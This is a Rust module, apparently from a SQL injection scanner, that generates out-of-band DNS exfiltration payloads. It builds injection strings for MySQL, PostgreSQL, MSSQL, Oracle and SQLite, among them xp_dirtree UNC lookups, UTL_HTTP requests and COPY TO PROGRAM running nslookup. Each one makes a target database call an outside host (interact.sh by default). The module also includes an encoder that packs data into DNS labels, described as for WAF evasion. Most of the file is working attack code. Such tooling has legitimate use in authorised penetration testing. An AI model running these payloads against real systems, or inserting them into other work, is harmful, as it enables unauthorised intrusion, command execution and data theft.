//! DNS Exfiltration Probes for SQL Injection Detection
//! Implement DNS exfiltration probes for databases supporting external name resolution.

use std::collections::{HashMap, VecDeque};
use std::time::{Duration, Instant};

/// Maximum DNS queries to track (bounded memory)
const MAX_DNS_QUERIES: usize = 500;

/// Default timeout for DNS probe verification
const DNS_TIMEOUT_SECS: u64 = 15;

/// DNS query record
#[derive(Debug, Clone)]
pub struct DnsQuery {
    pub token: String,
    pub domain: String,
    pub created_at: Instant,
    pub resolved: bool,
    pub resolver_ip: Option<String>,
    pub query_type: DnsQueryType,
}

/// DNS query type for different exfiltration techniques
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnsQueryType {
    A,      // Standard A record
    AAAA,   // IPv6 AAAA record
    TXT,    // TXT record for data exfil
    CNAME,  // CNAME chain
    MX,     // MX record
}

/// DNS exfiltration probe result
#[derive(Debug, Clone)]
pub struct DnsProbeResult {
    pub token: String,
    pub dbms_detected: Option<String>,
    pub data_exfiltrated: Option<String>,
    pub confidence: f64,
    pub response_time_ms: Option<u64>,
}

/// DNS exfiltration probe manager
pub struct DnsExfiltrationProbe {
    queries: VecDeque<DnsQuery>,
    results: HashMap<String, DnsProbeResult>,
    dns_servers: Vec<String>,
    timeout: Duration,
    base_domain: String,
}

impl DnsExfiltrationProbe {
    /// Create a new DNS exfiltration probe
    pub fn new() -> Self {
        Self {
            queries: VecDeque::with_capacity(MAX_DNS_QUERIES),
            results: HashMap::new(),
            dns_servers: vec![
                "8.8.8.8".to_string(),
                "1.1.1.1".to_string(),
                "9.9.9.9".to_string(),
            ],
            timeout: Duration::from_secs(DNS_TIMEOUT_SECS),
            base_domain: "interact.sh".to_string(),
        }
    }

    /// Set custom DNS servers
    pub fn set_dns_servers(&mut self, servers: Vec<String>) {
        self.dns_servers = servers;
    }

    /// Set base domain for OOB interactions
    pub fn set_base_domain(&mut self, domain: &str) {
        self.base_domain = domain.to_string();
    }

    /// Generate a unique token for DNS tracking
    pub fn generate_token() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis();
        let random_suffix = rand::random::<u32>();
        format!("{}_{}", timestamp, random_suffix)
    }

    /// Generate DNS exfiltration payloads for different DBMS
    pub fn generate_payloads(&self, token: &str, param: &str) -> Vec<(String, String)> {
        let mut payloads = Vec::new();
        let domain = format!("{}.{}", token, self.base_domain);

        // MySQL - LOAD_FILE with UNC path
        payloads.push((
            "mysql_unc".to_string(),
            format!("{}' AND LOAD_FILE(CONCAT('\\\\\\\\', '{}', '\\\\a'))-- ", param, domain),
        ));

        // MySQL - INTO OUTFILE (if writable)
        payloads.push((
            "mysql_outfile".to_string(),
            format!(
                "{}' UNION SELECT '' INTO OUTFILE '\\\\\\\\{}\\\\file.txt'-- ",
                param, domain
            ),
        ));

        // PostgreSQL - COPY with program (requires superuser)
        payloads.push((
            "postgres_copy".to_string(),
            format!(
                "{}'; COPY (SELECT version()) TO PROGRAM 'nslookup {}';-- ",
                param, domain
            ),
        ));

        // PostgreSQL - dblink
        payloads.push((
            "postgres_dblink".to_string(),
            format!(
                "{}'; SELECT dblink_connect('host={} dbname=test');-- ",
                param, domain.split('.').next().unwrap_or(token)
            ),
        ));

        // MSSQL - xp_dirtree
        payloads.push((
            "mssql_dirtree".to_string(),
            format!("{}'; EXEC master..xp_dirtree '\\\\{}\\share';-- ", param, domain),
        ));

        // MSSQL - xp_fileexist
        payloads.push((
            "mssql_fileexist".to_string(),
            format!("{}'; EXEC master..xp_fileexist '\\\\{}\\file';-- ", param, domain),
        ));

        // Oracle - UTL_INADDR.GET_HOST_ADDRESS
        payloads.push((
            "oracle_inaddr".to_string(),
            format!(
                "{}'; SELECT UTL_INADDR.GET_HOST_ADDRESS('{}') FROM dual;-- ",
                param, domain
            ),
        ));

        // Oracle - HTTP request triggering DNS
        payloads.push((
            "oracle_http".to_string(),
            format!(
                "{}'; BEGIN UTL_HTTP.request('http://{}'); END;-- ",
                param, domain
            ),
        ));

        // SQLite - ATTACH with network path (limited support)
        payloads.push((
            "sqlite_attach".to_string(),
            format!("{}'; ATTACH DATABASE '\\\\{}\\db.sqlite' AS oob;-- ", param, domain),
        ));

        // Generic - Comment injection for detection
        payloads.push((
            "generic_comment".to_string(),
            format!("{}' /* DNS:{} */ -- ", param, domain),
        ));

        payloads
    }

    /// Register a DNS query for tracking
    pub fn register_query(&mut self, token: &str, query_type: DnsQueryType) -> String {
        let domain = format!("{}.{}", token, self.base_domain);

        let query = DnsQuery {
            token: token.to_string(),
            domain: domain.clone(),
            created_at: Instant::now(),
            resolved: false,
            resolver_ip: None,
            query_type,
        };

        // Maintain bounded storage
        if self.queries.len() >= MAX_DNS_QUERIES {
            self.queries.pop_front();
        }

        self.queries.push_back(query);
        domain
    }

    /// Mark a DNS query as resolved
    pub fn mark_resolved(&mut self, token: &str, resolver_ip: Option<String>) {
        for query in self.queries.iter_mut() {
            if query.token == token {
                query.resolved = true;
                query.resolver_ip = resolver_ip;
                break;
            }
        }
    }

    /// Check if a DNS query was resolved
    pub fn is_resolved(&self, token: &str) -> bool {
        self.queries.iter().any(|q| q.token == token && q.resolved)
    }

    /// Record a probe result
    pub fn record_result(&mut self, token: &str, result: DnsProbeResult) {
        if self.results.len() < MAX_DNS_QUERIES / 2 {
            self.results.insert(token.to_string(), result);
        }
    }

    /// Get probe result for a token
    pub fn get_result(&self, token: &str) -> Option<&DnsProbeResult> {
        self.results.get(token)
    }

    /// Clean up expired queries
    pub fn cleanup_expired(&mut self) {
        let now = Instant::now();
        self.queries.retain(|q| now.duration_since(q.created_at) < self.timeout);
    }

    /// Get statistics about DNS probing
    pub fn get_stats(&self) -> DnsProbeStats {
        let total_queries = self.queries.len();
        let resolved_queries = self.queries.iter().filter(|q| q.resolved).count();
        let pending_queries = total_queries - resolved_queries;

        DnsProbeStats {
            total_queries,
            resolved_queries,
            pending_queries,
            result_count: self.results.len(),
        }
    }

    /// Reset probe state
    pub fn reset(&mut self) {
        self.queries.clear();
        self.results.clear();
    }
}

impl Default for DnsExfiltrationProbe {
    fn default() -> Self {
        Self::new()
    }
}

/// Statistics about DNS probing
#[derive(Debug, Clone)]
pub struct DnsProbeStats {
    pub total_queries: usize,
    pub resolved_queries: usize,
    pub pending_queries: usize,
    pub result_count: usize,
}

/// DNS payload encoder for WAF evasion
pub struct DnsPayloadEncoder;

impl DnsPayloadEncoder {
    /// Encode data for DNS exfiltration (hex encoding)
    pub fn hex_encode(data: &str) -> String {
        data.bytes()
            .map(|b| format!("{:02x}", b))
            .collect::<Vec<_>>()
            .join("")
    }

    /// Encode data for DNS exfiltration (base32-like)
    pub fn base32_encode(data: &str) -> String {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        let bytes = data.as_bytes();
        let mut result = String::new();

        let mut buffer: u64 = 0;
        let mut bits_left = 0;

        for &byte in bytes {
            buffer = (buffer << 8) | (byte as u64);
            bits_left += 8;

            while bits_left >= 5 {
                bits_left -= 5;
                let index = ((buffer >> bits_left) & 0x1F) as usize;
                result.push(ALPHABET[index] as char);
            }
        }

        if bits_left > 0 {
            let index = ((buffer << (5 - bits_left)) & 0x1F) as usize;
            result.push(ALPHABET[index] as char);
        }

        result
    }

    /// Split encoded data into DNS-safe labels
    pub fn split_into_labels(encoded: &str, max_label_len: usize) -> Vec<String> {
        encoded
            .chars()
            .collect::<Vec<_>>()
            .chunks(max_label_len)
            .map(|chunk| chunk.iter().collect())
            .collect()
    }

    /// Build full DNS query domain for exfiltration
    pub fn build_exfil_domain(data: &str, base_domain: &str, max_label_len: usize) -> String {
        let encoded = Self::hex_encode(data);
        let labels = Self::split_into_labels(&encoded, max_label_len);
        let mut parts: Vec<String> = labels.into_iter().rev().collect();
        parts.push(base_domain.to_string());
        parts.join(".")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let probe = DnsExfiltrationProbe::new();
        let token = DnsExfiltrationProbe::generate_token();
        let payloads = probe.generate_payloads(&token, "id");

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(t, _)| t == "mssql_dirtree"));
        assert!(payloads.iter().any(|(t, _)| t == "oracle_inaddr"));
    }

    #[test]
    fn test_query_tracking() {
        let mut probe = DnsExfiltrationProbe::new();
        let token = DnsExfiltrationProbe::generate_token();

        probe.register_query(&token, DnsQueryType::A);
        assert!(!probe.is_resolved(&token));

        probe.mark_resolved(&token, Some("8.8.8.8".to_string()));
        assert!(probe.is_resolved(&token));
    }

    #[test]
    fn test_hex_encoding() {
        let encoded = DnsPayloadEncoder::hex_encode("Hello");
        assert_eq!(encoded, "48656c6c6f");
    }

    #[test]
    fn test_domain_building() {
        let domain = DnsPayloadEncoder::build_exfil_domain("ABC", "example.com", 63);
        assert!(domain.ends_with("example.com"));
        assert!(domain.contains("414243")); // Hex of ABC
    }

    #[test]
    fn test_probe_stats() {
        let mut probe = DnsExfiltrationProbe::new();
        let token = DnsExfiltrationProbe::generate_token();

        probe.register_query(&token, DnsQueryType::A);
        probe.mark_resolved(&token, None);

        let stats = probe.get_stats();
        assert_eq!(stats.total_queries, 1);
        assert_eq!(stats.resolved_queries, 1);
    }
}
